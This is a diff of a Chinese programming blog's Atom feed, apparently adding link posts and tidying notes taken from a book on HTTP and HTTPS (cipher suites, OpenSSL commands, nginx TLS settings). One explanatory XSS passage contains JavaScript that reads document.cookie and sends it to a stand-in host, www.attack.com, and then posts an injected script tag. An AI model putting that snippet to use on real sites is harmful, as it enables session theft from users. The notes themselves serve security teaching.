@@ -1,4 +1,9 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-13T17:12:45+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hofer’s Blog</title><subtitle>编程随想</subtitle><author><name>Hofer</name></author><entry><title type="html">深入浅出 HTTPS：从原理到实战</title><link href="http://localhost:4000/a-https-book/" rel="alternate" type="text/html" title="深入浅出 HTTPS：从原理到实战" /><published>2022-09-13T00:00:00+08:00</published><updated>2022-09-13T00:00:00+08:00</updated><id>http://localhost:4000/a-https-book</id><content type="html" xml:base="http://localhost:4000/a-https-book/">&lt;p&gt;深入浅出 HTTPS：从原理到实战&lt;br /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-10T16:22:46+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hofer’s Blog</title><subtitle>编程随想</subtitle><author><name>Hofer</name></author><entry><title type="html">6.824 Distributed Systems</title><link href="http://localhost:4000/mit6-824/" rel="alternate" type="text/html" title="6.824 Distributed Systems" /><published>2022-10-09T00:00:00+08:00</published><updated>2022-10-09T00:00:00+08:00</updated><id>http://localhost:4000/mit6-824</id><content type="html" xml:base="http://localhost:4000/mit6-824/">&lt;p&gt;课程主页&lt;br /&gt;
+&lt;a href=&quot;https://pdos.csail.mit.edu/6.824/index.html&quot;&gt;https://pdos.csail.mit.edu/6.824/index.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/av87684880/&quot;&gt;https://www.bilibili.com/video/av87684880/&lt;/a&gt;&lt;/p&gt;</content><author><name>Hofer</name></author><category term="cs" /><summary type="html">课程主页 https://pdos.csail.mit.edu/6.824/index.html</summary></entry><entry><title type="html">计算机科学入门</title><link href="http://localhost:4000/cs101/" rel="alternate" type="text/html" title="计算机科学入门" /><published>2022-10-08T00:00:00+08:00</published><updated>2022-10-08T00:00:00+08:00</updated><id>http://localhost:4000/cs101</id><content type="html" xml:base="http://localhost:4000/cs101/">&lt;p&gt;&lt;a href=&quot;https://www.kawabangga.com/collection&quot;&gt;https://www.kawabangga.com/collection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://teachyourselfcs.com/&quot;&gt;https://teachyourselfcs.com/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://csdiy.wiki/&quot;&gt;https://csdiy.wiki/&lt;/a&gt;&lt;/p&gt;</content><author><name>Hofer</name></author><category term="cs" /><summary type="html">https://www.kawabangga.com/collection https://teachyourselfcs.com/ https://csdiy.wiki/</summary></entry><entry><title type="html">深入浅出 HTTPS：从原理到实战</title><link href="http://localhost:4000/a-https-book/" rel="alternate" type="text/html" title="深入浅出 HTTPS：从原理到实战" /><published>2022-09-13T00:00:00+08:00</published><updated>2022-09-13T00:00:00+08:00</updated><id>http://localhost:4000/a-https-book</id><content type="html" xml:base="http://localhost:4000/a-https-book/">&lt;p&gt;深入浅出 HTTPS：从原理到实战&lt;br /&gt;
 from &lt;a href=&quot;https://book4you.org/book/18090421/60096e&quot;&gt;ZLibrary&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;https://book.douban.com/subject/30250772/&quot;&gt;豆瓣评论&lt;/a&gt;&lt;/p&gt;
 
@@ -256,18 +261,10 @@ Web 由很多资源组成，比如 HTML 页面、视频、图片，在互联网�
 &lt;p&gt;Web 技术推动了互联网的发展，HTTP 也不是孤立存在的，在理解的时候务必要明白HTTP 和其他两种技术的关系。&lt;/p&gt;
 
 &lt;h2 id=&quot;12-理解-http&quot;&gt;1.2 理解 HTTP&lt;/h2&gt;
-
-&lt;p&gt;HTTP 耳熟能详，很容易和互联网、Web 概念相混淆，看上去很简单的协议，其实很&lt;/p&gt;
-
-&lt;p&gt;多技术人员并没有理解该协议的本质，本节简单介绍其相关概念，从整体上理解其本质。&lt;/p&gt;
+&lt;p&gt;HTTP 耳熟能详，很容易和互联网、Web 概念相混淆，看上去很简单的协议，其实很多技术人员并没有理解该协议的本质，本节简单介绍其相关概念，从整体上理解其本质。&lt;/p&gt;
 
 &lt;h3 id=&quot;121-http-的定义&quot;&gt;1.2.1 HTTP 的定义&lt;/h3&gt;
-
-&lt;p&gt;HTTP 提供了一组规则和标准，从而让信息能够在互联网上进行传播，也正是通过&lt;/p&gt;
-
-&lt;p&gt;HTTP，互联网上的设备才能够互相通信，并明白对方的含义。&lt;/p&gt;
-
-&lt;p&gt;第 1 章 HTTP 介绍&lt;/p&gt;
+&lt;p&gt;HTTP 提供了一组规则和标准，从而让信息能够在互联网上进行传播，也正是通过 HTTP，互联网上的设备才能够互相通信，并明白对方的含义。&lt;/p&gt;
 
 &lt;p&gt;HTTP 目前的版本是 HTTP/1.1，定义在 RFC 2616 规范上，相比 HTTP/0.9 和 HTTP/1.0&lt;/p&gt;
 
@@ -393,8 +390,6 @@ Web 由很多资源组成，比如 HTML 页面、视频、图片，在互联网�
 
 &lt;p&gt;中部分 HTTP 头部的含义。&lt;/p&gt;
 
-&lt;p&gt;第 1 章 HTTP 介绍&lt;/p&gt;
-
 &lt;p&gt;图 1-1 HTTP 请求结构&lt;/p&gt;
 
 &lt;p&gt;图 1-2 HTTP 响应结构&lt;/p&gt;
@@ -499,8 +494,6 @@ Web 由很多资源组成，比如 HTML 页面、视频、图片，在互联网�
 
 &lt;p&gt;无状态的设计已经不能适应新的情况，为了保持状态，出现了 Cookie 和 Session 技术，但&lt;/p&gt;
 
-&lt;p&gt;第 1 章 HTTP 介绍&lt;/p&gt;
-
 &lt;p&gt;是 Cookie 技术设计得非常不严谨，引发了很多安全问题。&lt;/p&gt;
 
 &lt;p&gt;介绍下 Cookie 是如何进行会话保持的，客户端第一次请求完成后，服务器会发送&lt;/p&gt;
@@ -598,8 +591,6 @@ Web 由很多资源组成，比如 HTML 页面、视频、图片，在互联网�
 &lt;p&gt;三次握手过程如下（见图 1-4）：&lt;/p&gt;
 
 &lt;p&gt;◎ 初始化连接，客户端发送 SYN 消息（随机值 x）请求一个新连接。&lt;/p&gt;
-
-&lt;p&gt;第 1 章 HTTP 介绍&lt;/p&gt;
 
 &lt;p&gt;◎ 服务器接收 SYN 消息，发送 SYN ACK 响应消息。&lt;/p&gt;
 
@@ -702,8 +693,6 @@ Web 由很多资源组成，比如 HTML 页面、视频、图片，在互联网�
 &lt;p&gt;exit;&lt;/p&gt;
 
 &lt;p&gt;}&lt;/p&gt;
-
-&lt;p&gt;第 1 章 HTTP 介绍&lt;/p&gt;
 
 &lt;p&gt;echo “请求发送成功 \n”;&lt;/p&gt;
 
@@ -814,8 +803,6 @@ Web 由很多资源组成，比如 HTML 页面、视频、图片，在互联网�
 &lt;p&gt;◎ 应用语言可以对消息加密，但浏览器接收到消息的时候，并不知道如何解密消息，&lt;/p&gt;
 
 &lt;p&gt;这种方案至少在 Web 应用上没有可行性，因为违反了 HTTP 标准。&lt;/p&gt;
-
-&lt;p&gt;第 1 章 HTTP 介绍&lt;/p&gt;
 
 &lt;p&gt;2）无法验证身份&lt;/p&gt;
 
@@ -929,8 +916,6 @@ Web 由很多资源组成，比如 HTML 页面、视频、图片，在互联网�
 
 &lt;p&gt;attack.js’&amp;gt;&amp;lt;/script&amp;gt;）。&lt;/p&gt;
 
-&lt;p&gt;第 1 章 HTTP 介绍&lt;/p&gt;
-
 &lt;p&gt;◎ 由于服务器没有任何的校验机制，所以正常生成了一篇文章，比如 http://www.&lt;/p&gt;
 
 &lt;p&gt;example.com/article.html。&lt;/p&gt;
@@ -951,15 +936,15 @@ var cookie = encodeURIComponent(document.cookie)
 
 
 
-$(&apos;&lt;img src=&quot;http://www.attack.com/attack.php?cookie=&apos;+ cookie +&apos;&quot;&gt;&apos;).
+$('&lt;img src=&quot;http://www.attack.com/attack.php?cookie='+ cookie +'&quot;&gt;').
 
 appendTo($(document.body))
 
 
 
-var content = &quot;&lt;scr&quot;+&quot;ipt type=&apos;text/javascript&apos; src=&apos;http://www.attack.
+var content = &quot;&lt;scr&quot;+&quot;ipt type='text/javascript' src='http://www.attack.
 
-com/attack.js&apos;&gt;&lt;/scr&quot;+&quot;ipt&gt;&quot;
+com/attack.js'&gt;&lt;/scr&quot;+&quot;ipt&gt;&quot;
 
 $.post(&quot;http://www.example.com/sendArticle.php&quot;,{content:content}, function(result){});
 
@@ -21833,7 +21818,7 @@ OpenSSL 命令行工具了解密码套件。
 
 比如在 OpenSSL 1.1.0g 版本中输入如下命令会产生如下错误：
 
-$ openssl ciphers -V &apos;RC4&apos; | column -t
+$ openssl ciphers -V 'RC4' | column -t
 
 
 
@@ -21915,7 +21900,7 @@ GCM_SHA256
 
 输入如下命令：
 
-$ openssl ciphers -V &apos;ECDHE-ECDSA-AES256-GCM-SHA384&apos; | column -t 0xC0,0x2C - ECDHE-ECDSA-AES256-GCM-SHA384 TLSv1.2 Kx=ECDH Au=ECDSA Enc=AESGCM(256) Mac=AEAD
+$ openssl ciphers -V 'ECDHE-ECDSA-AES256-GCM-SHA384' | column -t 0xC0,0x2C - ECDHE-ECDSA-AES256-GCM-SHA384 TLSv1.2 Kx=ECDH Au=ECDSA Enc=AESGCM(256) Mac=AEAD
 
 该命令输出特定名称的密码套件。
 
@@ -22043,7 +22028,7 @@ ServerKeyExchange 消息传递 DH 参数。
 
 使用临时的 ECDH 密钥协商算法，包含匿名的密码套件。
 
-$ openssl ciphers -V &apos;kECDHE&apos; | column -t
+$ openssl ciphers -V 'kECDHE' | column -t
 
 
 
@@ -22063,7 +22048,7 @@ $ openssl ciphers -V &apos;kECDHE&apos; | column -t
 
 和 kEECDH、kECDHE、ECDH 密码套件差不多，但是不包含匿名的密码套件。
 
-$ openssl ciphers -V &apos;ECDHE&apos; | column -t
+$ openssl ciphers -V 'ECDHE' | column -t
 
 
 
@@ -22097,7 +22082,7 @@ $ openssl ciphers -V &apos;ECDHE&apos; | column -t
 
 该密码套件对应的证书中包含 DSS 公钥，在 HTTPS 中，相关的密码套件使用得并不多。
 
-$ openssl ciphers -V &apos;DSS&apos; | column -t
+$ openssl ciphers -V 'DSS' | column -t
 
 
 
@@ -22129,7 +22114,7 @@ DHE_PSK、RSA_PSK 密码套件。
 
 使用 kPSK 关键字测试：
 
-$ openssl ciphers -V &apos;kPSK&apos; | column -t
+$ openssl ciphers -V 'kPSK' | column -t
 
 
 
@@ -22147,7 +22132,7 @@ Enc=CHACHA20/POLY1305(256) Mac=AEAD
 
 使用 kECDHEPSK 关键字测试：
 
-$ openssl ciphers -V &apos;kECDHEPSK&apos; | column -t
+$ openssl ciphers -V 'kECDHEPSK' | column -t
 
 
 
@@ -22161,7 +22146,7 @@ Enc=AES(256) Mac=SHA384
 
 使用 kDHEPSK 关键字测试：
 
-$ ciphers -V &apos;kDHEPSK&apos; | column -t
+$ ciphers -V 'kDHEPSK' | column -t
 
 
 
@@ -22175,7 +22160,7 @@ Enc=CHACHA20/POLY1305(256) Mac=AEAD
 
 使用 kRSAPSK 关键字测试：
 
-$ openssl ciphers -V &apos;kRSAPSK&apos; | column -t
+$ openssl ciphers -V 'kRSAPSK' | column -t
 
 
 
@@ -22187,7 +22172,7 @@ $ openssl ciphers -V &apos;kRSAPSK&apos; | column -t
 
 使用 SRP 进行密钥协商的密码套件，该套件在 HTTPS 中不太常见。
 
-$ openssl ciphers -V &apos;SRP&apos; | column -t
+$ openssl ciphers -V 'SRP' | column -t
 
 
 
@@ -22265,7 +22250,7 @@ eNULL、NULL
 
 查看 AESGCM 对应的加密算法：
 
-$ openssl ciphers -V &apos;AESGCM&apos; | column -t
+$ openssl ciphers -V 'AESGCM' | column -t
 
 
 
@@ -22285,7 +22270,7 @@ $ openssl ciphers -V &apos;AESGCM&apos; | column -t
 
 查看 CHACHA20-POLY1305 加密模式：
 
-$ openssl ciphers -V &apos;CHACHA20&apos; | column -t
+$ openssl ciphers -V 'CHACHA20' | column -t
 
 
 
@@ -22305,7 +22290,7 @@ Au=ECDSA Enc=CHACHA20/POLY1305(256) Mac=AEAD
 
 查看 AESCCM 加密算法：
 
-$ openssl ciphers -V &apos;AESCCM&apos; | column -t
+$ openssl ciphers -V 'AESCCM' | column -t
 
 
 
@@ -22319,7 +22304,7 @@ $ openssl ciphers -V &apos;AESCCM&apos; | column -t
 
 查看 AES 加密算法：
 
-$ openssl ciphers -V &apos;AES&apos; | column -t
+$ openssl ciphers -V 'AES' | column -t
 
 
 
@@ -22339,7 +22324,7 @@ Au=ECDSA Enc=AES(256) Mac=SHA384
 
 查看 3DES 加密算法：
 
-openssl ciphers -V &apos;3DES&apos; | column -t
+openssl ciphers -V '3DES' | column -t
 
 0xC0,0x12 - ECDHE-RSA-DES-CBC3-SHA SSLv3 Kx=ECDH Au=RSA Enc=3DES(168) Mac=SHA1
 
@@ -22353,7 +22338,7 @@ openssl ciphers -V &apos;3DES&apos; | column -t
 
 （1）MD5
 
-$ openssl ciphers -V &apos;MD5&apos; | column -t
+$ openssl ciphers -V 'MD5' | column -t
 
 
 
@@ -22361,7 +22346,7 @@ $ openssl ciphers -V &apos;MD5&apos; | column -t
 
 （2）SHA1、SHA
 
-$ openssl ciphers -V &apos;SHA&apos; | column -t
+$ openssl ciphers -V 'SHA' | column -t
 
 
 
@@ -22377,7 +22362,7 @@ Enc=None Mac=SHA1
 
 （3）SHA256、SHA384
 
-$ openssl ciphers -V &apos;SHA384&apos; | column -t
+$ openssl ciphers -V 'SHA384' | column -t
 
 
 
@@ -22431,7 +22416,7 @@ FAULT 和 eNULL 密码套件。
 
 套件。
 
-$ openssl ciphers -V &apos;COMPLEMENTOFALL&apos; | column -t
+$ openssl ciphers -V 'COMPLEMENTOFALL' | column -t
 
 
 
@@ -22451,7 +22436,7 @@ $ openssl ciphers -V &apos;COMPLEMENTOFALL&apos; | column -t
 
 查看 HIGH 关键字对应的密码套件：
 
-$ openssl ciphers -V &apos;HIGH&apos; | column -t
+$ openssl ciphers -V 'HIGH' | column -t
 
 
 
@@ -22477,7 +22462,7 @@ Mac=AEAD
 
 查看 MEDIUM 关键字对应的密码套件：
 
-$ openssl ciphers -V &apos;MEDIUM&apos; | column -t
+$ openssl ciphers -V 'MEDIUM' | column -t
 
 
 
@@ -22493,7 +22478,7 @@ $ openssl ciphers -V &apos;MEDIUM&apos; | column -t
 
 查看 LOW 关键字对应的密码套件：
 
-$ openssl ciphers -V &apos;LOW&apos; | column -t
+$ openssl ciphers -V 'LOW' | column -t
 
 
 
@@ -22511,7 +22496,7 @@ $ openssl ciphers -V &apos;LOW&apos; | column -t
 
 密码套件，可以通过配置特定版本的 TLS/SSL 协议来控制。
 
-$ openssl ciphers -V &apos;TLSv1.0&apos; | column -t
+$ openssl ciphers -V 'TLSv1.0' | column -t
 
 
 
@@ -22537,7 +22522,7 @@ ac=SHA1
 
 操作（AND）。
 
-$ openssl ciphers -V &apos;AES+SHA256&apos; | column -t
+$ openssl ciphers -V 'AES+SHA256' | column -t
 
 
 
@@ -22561,7 +22546,7 @@ $ openssl ciphers -V &apos;AES+SHA256&apos; | column -t
 
 在 HTTPS 网站中，配置密码套件使用最多的关键字就是冒号（:）关键字。
 
-$ openssl ciphers -V &apos;AES:SHA256&apos; | column -t
+$ openssl ciphers -V 'AES:SHA256' | column -t
 
 
 
@@ -22591,7 +22576,7 @@ Enc=AESGCM(256) Mac=AEAD
 
 输入以下命令：
 
-$ openssl ciphers -V &apos;eNULL:SHA384&apos; | column -t
+$ openssl ciphers -V 'eNULL:SHA384' | column -t
 
 可以看出符合 eNULL 关键字的密码套件排在输出的前列，SHA384 关键字对应的密
 
@@ -22603,7 +22588,7 @@ $ openssl ciphers -V &apos;eNULL:SHA384&apos; | column -t
 
 再加入当前密码套件列表中。
 
-$ openssl ciphers -V &apos;DEFAULT:!CHACHA20:CHACHA20&apos; | column -t 上面的示例输出最终不包含 CHACHA20-POLY1305 密码套件，就算再显式添加也不
+$ openssl ciphers -V 'DEFAULT:!CHACHA20:CHACHA20' | column -t 上面的示例输出最终不包含 CHACHA20-POLY1305 密码套件，就算再显式添加也不
 
 会出现在密码套件列表中。
 
@@ -22611,7 +22596,7 @@ $ openssl ciphers -V &apos;DEFAULT:!CHACHA20:CHACHA20&apos; | column -t 上面�
 
 从当前的密码套件列表中删除部分密码套件，删除的密码套件可以再加入套件列表中。
 
-$ openssl ciphers -V &apos;DEFAULT:-AESGCM:AESGCM&apos; | column -t 
+$ openssl ciphers -V 'DEFAULT:-AESGCM:AESGCM' | column -t 
 
 
 
@@ -22637,13 +22622,13 @@ $ openssl ciphers -V &apos;DEFAULT:-AESGCM:AESGCM&apos; | column -t
 
 输入以下命令：
 
-$ openssl ciphers -V &apos;DEFAULT:+3DES&apos; | column -t
+$ openssl ciphers -V 'DEFAULT:+3DES' | column -t
 
 从输出可以看出 3DES 关键字对应的密码套件被移到了最后面。
 
 注意+组合关键字和+修饰符的作用是不一样的，运行下列命令进行比较：
 
-$ openssl ciphers -V &apos;AES:+SHA256&apos; | column -t | wc -l $ openssl ciphers -V &apos;AES+SHA256&apos; | column -t | wc -l
+$ openssl ciphers -V 'AES:+SHA256' | column -t | wc -l $ openssl ciphers -V 'AES+SHA256' | column -t | wc -l
 
 第一个示例是找出所有匹配 AES 关键字或者匹配 SHA256 关键字对应的密码套件列
 
@@ -22659,7 +22644,7 @@ $ openssl ciphers -V &apos;AES:+SHA256&apos; | column -t | wc -l $ openssl ciphe
 
 码套件优先级会更高，举例如下：
 
-$ openssl ciphers -v &apos;AES:@STRENGTH&apos;
+$ openssl ciphers -v 'AES:@STRENGTH'
 
 ### 9.1.3 密码套件一览
 
@@ -26591,7 +26576,7 @@ ssl_protocols TLSv1.2;
 
 
 
-ssl_ciphers &apos;ECDHE-ECDSA-AES256-GCM-SHA384:
+ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:
 
 ECDHE-RSA-AES256-GCM-SHA384:
 
@@ -26611,7 +26596,7 @@ ECDHE-RSA-AES256-SHA384:
 
 ECDHE-ECDSA-AES128-SHA256:
 
-ECDHE-RSA-AES128-SHA256&apos;;
+ECDHE-RSA-AES128-SHA256';
 
 该配置的含义：
 
@@ -26649,7 +26634,7 @@ ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
 
 
 
-ssl_ciphers &apos;ECDHE-ECDSA-CHACHA20-POLY1305:
+ssl_ciphers 'ECDHE-ECDSA-CHACHA20-POLY1305:
 
 ECDHE-RSA-CHACHA20-POLY1305:
 
@@ -26713,7 +26698,7 @@ AES256-SHA:
 
 DES-CBC3-SHA:
 
-!DSS&apos;;
+!DSS';
 
 该配置的含义：
 
@@ -26743,7 +26728,7 @@ ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;
 
 
 
-ssl_ciphers &apos;ECDHE-ECDSA-CHACHA20-POLY1305:
+ssl_ciphers 'ECDHE-ECDSA-CHACHA20-POLY1305:
 
 ECDHE-RSA-CHACHA20-POLY1305:
 
@@ -26815,7 +26800,7 @@ HIGH:SEED:!aNULL:!eNULL:!EXPORT:
 
 !aDH:!aECDH:!EDH-DSS-DES-CBC3-SHA:
 
-!KRB5-DES-CBC3-SHA:!SRP&apos;;
+!KRB5-DES-CBC3-SHA:!SRP';
 
 该配置的含义：
 
@@ -26923,13 +26908,13 @@ ssl_protocols TLSv1.2;
 
 ssl_ciphers
 
-&apos;ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-
+'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-
 
 SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA
 
 -AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECD
 
-HE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256&apos;; ssl_prefer_server_ciphers on;
+HE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256'; ssl_prefer_server_ciphers on;
 
 
 
@@ -27007,7 +26992,7 @@ https://github.com/cloudflare/sslconfig
 
 sslconfig 推荐的 HTTPS 配置如下：
 
-ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ecdh_curve X25519:P-256:P-384:P-224:P-521; ssl_ciphers &apos;[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]: ECDHE+AES128:
+ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ecdh_curve X25519:P-256:P-384:P-224:P-521; ssl_ciphers '[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]: ECDHE+AES128:
 
 
 
@@ -27019,7 +27004,7 @@ RSA+AES256:
 
 ECDHE+3DES:
 
-RSA+3DES&apos;;
+RSA+3DES';
 
 
 
@@ -27085,11 +27070,11 @@ Nginx 的 ssl_prefer_server_ciphers 指令默认是关闭的，表示协商的�
 
 ssl_prefer_server_ciphers off;
 
-ssl_ciphers &apos;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305&apos; ; 然后使用 openssl s_client 子命令进行测试。
+ssl_ciphers 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305' ; 然后使用 openssl s_client 子命令进行测试。
 
 第一个测试，优先发送 ECDHE-RSA-AES128-GCM-SHA256 密码套件：
 
-$ openssl s_client -connect www.example.com:443 -cipher &apos;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305&apos;
+$ openssl s_client -connect www.example.com:443 -cipher 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305'
 
 
 
@@ -27101,7 +27086,7 @@ Cipher : ECDHE-RSA-AES128-GCM-SHA256
 
 第二个测试，优先发送 ECDHE-RSA-CHACHA20-POLY1305 密码套件：
 
-$ openssl s_client -connect www.example.com:443 -cipher &apos;ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256&apos;
+$ openssl s_client -connect www.example.com:443 -cipher 'ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256'
 
 
 
@@ -27123,13 +27108,13 @@ Cipher : ECDHE-RSA-CHACHA20-POLY1305
 
 ssl_prefer_server_ciphers on;
 
-ssl_ciphers &apos;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305&apos; ; 然后使用 openssl s_client 子命令进行测试。
+ssl_ciphers 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305' ; 然后使用 openssl s_client 子命令进行测试。
 
 第一个测试，优先发送 ECDHE-RSA-AES128-GCM-SHA256 密码套件：
 
-$ openssl s_client -connect www.example.com:443 -cipher &apos;ECDHE-RSA-AES128-
+$ openssl s_client -connect www.example.com:443 -cipher 'ECDHE-RSA-AES128-
 
-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305&apos;
+GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305'
 
 
 
@@ -27141,7 +27126,7 @@ Cipher : ECDHE-RSA-AES128-GCM-SHA256
 
 第二个测试，优先发送 ECDHE-RSA-CHACHA20-POLY1305 密码套件：
 
-$ openssl s_client -connect www.example.com:443 -cipher &apos;ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256&apos;
+$ openssl s_client -connect www.example.com:443 -cipher 'ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256'
 
 
 
@@ -27177,9 +27162,9 @@ BoringSSL 支持一种称为等价加密算法组（Equal Preference Cipher Grou
 
 ssl_prefer_server_ciphers on;
 
-ssl_ciphers &apos;[ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]&apos; ; 第一个测试，优先发送 ECDHE-RSA-AES128-GCM-SHA256 密码套件：
+ssl_ciphers '[ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]' ; 第一个测试，优先发送 ECDHE-RSA-AES128-GCM-SHA256 密码套件：
 
-$ openssl s_client -connect www.example.com:443 -cipher &apos;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305&apos;
+$ openssl s_client -connect www.example.com:443 -cipher 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305'
 
 
 
@@ -27195,7 +27180,7 @@ Cipher : ECDHE-RSA-AES128-GCM-SHA256
 
 第二个测试，优先发送 ECDHE-RSA-CHACHA20-POLY1305 密码套件：
 
-$ openssl s_client -connect www.example.com:443 -cipher &apos;ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256&apos;
+$ openssl s_client -connect www.example.com:443 -cipher 'ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256'
 
 
 
@@ -27227,7 +27212,7 @@ patch，后面会介绍，本节主要介绍等价加密算法组的概念。
 
 sslconfig 的 HTTPS 配置如下：
 
-ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ecdh_curve X25519:P-256:P-384:P-224:P-521; ssl_ciphers &apos;[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]: ECDHE+AES128:
+ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ecdh_curve X25519:P-256:P-384:P-224:P-521; ssl_ciphers '[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]: ECDHE+AES128:
 
 RSA+AES128:
 
@@ -27237,7 +27222,7 @@ RSA+AES256:
 
 ECDHE+3DES:
 
-RSA+3DES&apos;;
+RSA+3DES';
 
 
 
@@ -27383,7 +27368,7 @@ No
 
 弱密钥
 
-Let&apos;s Encrypt Authority X3（AIA:
+Let's Encrypt Authority X3（AIA:
 
 Issuer
 
@@ -28755,7 +28740,7 @@ depth=2 O = Digital Signature Trust Co., CN = DST Root CA X3
 
 verify return:1
 
-depth=1 C = US, O = Let&apos;s Encrypt, CN = Let&apos;s Encrypt Authority X3
+depth=1 C = US, O = Let's Encrypt, CN = Let's Encrypt Authority X3
 
 verify return:1
 
@@ -28773,9 +28758,9 @@ Certificate chain
 
 0 s:/CN=www2.newyingyong.cn
 
-i:/C=US/O=Let&apos;s Encrypt/CN=Let&apos;s Encrypt Authority X3
+i:/C=US/O=Let's Encrypt/CN=Let's Encrypt Authority X3
 
-1 s:/C=US/O=Let&apos;s Encrypt/CN=Let&apos;s Encrypt Authority X3
+1 s:/C=US/O=Let's Encrypt/CN=Let's Encrypt Authority X3
 
 i:/O=Digital Signature Trust Co./CN=DST Root CA X3
 
@@ -28799,7 +28784,7 @@ MIIFCTCCA/GgAwIBAgISBFTeaUNIp4iq2Fhk9OE9bXedMA0GCSqGSIb3DQEBCwUA MEoxCzAJBgNVBAY
 
 subject=/CN=www2.newyingyong.cn
 
-issuer=/C=US/O=Let&apos;s Encrypt/CN=Let&apos;s Encrypt Authority X3
+issuer=/C=US/O=Let's Encrypt/CN=Let's Encrypt Authority X3
 
 第 二 部 分 显 示 服 务 器 实 体 证 书 ， -----BEGIN CERTIFICATE----- 和 -----END
 
@@ -28809,9 +28794,9 @@ CERTIFICATE-----之间的内容就是服务器实体的证书，将内容保存�
 
 通过一个例子了解如何获取和校验证书：
 
-$ openssl s_client -connect www.example.com:443 2&amp;gt;&amp;amp;1 | sed -ne &apos;/-BEGIN
+$ openssl s_client -connect www.example.com:443 2&amp;gt;&amp;amp;1 | sed -ne '/-BEGIN
 
-CERTIFICATE-/,/-END CERTIFICATE-/p&apos; &amp;gt;cert.pem
+CERTIFICATE-/,/-END CERTIFICATE-/p' &amp;gt;cert.pem
 
 
 
@@ -29066,7 +29051,7 @@ depth=2 O = Digital Signature Trust Co., CN = DST Root CA X3
 
 verify return:1
 
-depth=1 C = US, O = Let&apos;s Encrypt, CN = Let&apos;s Encrypt Authority X3
+depth=1 C = US, O = Let's Encrypt, CN = Let's Encrypt Authority X3
 
 verify return:1
 
@@ -29550,7 +29535,7 @@ https://www.sslchecker.com/sslchecker
 
 在线解析网站证书链是否正确的工具，也可
 
-What&apos;s My Chain Cert
+What's My Chain Cert
 
 https://whatsmychaincert.com
 
@@ -30018,11 +30003,11 @@ default_type application/octet-stream;
 
 
 
-log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;
+log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; '
 
-&apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;
+'$status $body_bytes_sent &quot;$http_referer&quot; '
 
